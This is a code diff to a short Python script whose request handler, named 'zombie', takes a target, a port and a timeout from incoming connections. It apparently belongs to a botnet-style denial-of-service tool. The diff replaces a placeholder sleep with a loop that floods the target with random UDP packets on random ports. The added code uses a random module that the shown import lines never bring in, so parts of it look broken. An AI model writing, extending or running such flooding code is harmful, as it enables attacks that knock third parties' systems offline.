@@ -1,6 +1,7 @@
 import SocketServer
 import time
 import socket
+import os
 
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
@@ -10,7 +11,13 @@ class zombie(SocketServer.BaseRequestHandler):
         self.attack(float(timeout), target, int(port))
 
     def attack(self, timeout, target, port):
-        time.sleep(timeout)
+        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        MESSAGE = os.urandom(100)
+
+        start = time.clock()
+        while time.clock() - start < timeout:
+            port = random.randint(1, 65535)
+            victim.sendto(MESSAGE, (target, port))
 
 if __name__ == '__main__':
     HOST = socket.gethostbyname(socket.gethostname())
